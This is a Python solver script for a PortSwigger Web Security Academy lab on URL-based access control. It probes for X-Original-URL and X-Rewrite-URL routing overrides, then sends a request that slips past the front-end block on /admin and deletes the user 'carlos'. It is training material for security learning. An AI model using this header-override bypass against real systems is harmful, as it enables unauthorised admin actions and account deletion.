#!/usr/bin/env python3
"""
URL-based access control can be circumvented
PortSwigger Web Security Academy -- Access Control

Companion script for the writeup: 10-url-based-access-control-circumvented.md

What this does:
    The front-end blocks direct requests to /admin, but a back-end routing
    layer trusts the X-Original-URL header for path selection. Requests /
    (a path the front-end never blocks) with X-Original-URL: /admin/delete
    and the target user on the real query string -- the header only
    overrides the path component, so the query parameters stay on the
    literal request.

Usage:
    python 10-url-based-access-control-circumvented.py <lab-url>

Requirements:
    pip install httpx
"""

import sys
import httpx


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    blocked = client.get(f"{lab_url}/admin")
    print(f"[*] Direct GET /admin: {blocked.status_code}")

    for header_name in ("X-Original-URL", "X-Rewrite-URL"):
        probe = client.get(lab_url, headers={header_name: "/admin"})
        print(f"[*] GET / with {header_name}: /admin -> {probe.status_code}")
        if probe.status_code == 200 and "access denied" not in probe.text.lower():
            print(f"[+] {header_name} routing override confirmed.")

    resp = client.get(
        f"{lab_url}/?username=carlos",
        headers={"X-Original-URL": "/admin/delete"},
    )
    print(f"[*] Delete carlos via X-Original-URL: /admin/delete -> {resp.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- carlos deleted via X-Original-URL routing bypass.")
    else:
        print("[-] Not solved yet -- confirm the back-end actually honors X-Original-URL.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
